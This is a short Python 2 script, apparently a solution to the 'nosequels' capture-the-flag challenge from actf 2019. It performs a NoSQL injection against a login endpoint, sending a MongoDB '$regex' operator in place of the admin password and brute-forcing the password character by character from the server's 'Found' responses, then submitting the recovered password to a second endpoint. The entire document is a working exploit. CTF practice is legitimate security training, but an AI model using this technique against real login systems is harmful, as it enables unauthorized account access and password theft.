# python2
# coding=utf-8
import requests
import sys
import json

url = 'https://nosequels.2019.chall.actf.co/login'
url2 ='https://nosequels.2019.chall.actf.co/site'
cookie = {'token':sys.argv[1]}
header = {'Content-Type' : 'application/json'}

pwd = ''
win = False
while 1:
  for i in range(97, 128):
    data = {"username":"admin", "password":{"$regex":"^{0}.*$".format(pwd + chr(i))}}
    data = json.dumps(data)
    print 'try {0}'.format(pwd+chr(i))
    res = requests.post(
      url = url,
      headers = header,
      cookies = cookie,
      data = data,
      allow_redirects = False
    )
    if 'Found' in res.content:
      print 'get {0}'.format(pwd)
      pwd += chr(i)
      res = requests.post(
        url = url2,
        cookies = cookie,
        data = {'pass2' : pwd}
      )
      if 'Wrong' not in res.content:
        print res.content
        win = True 
      break 
  if win:
    break
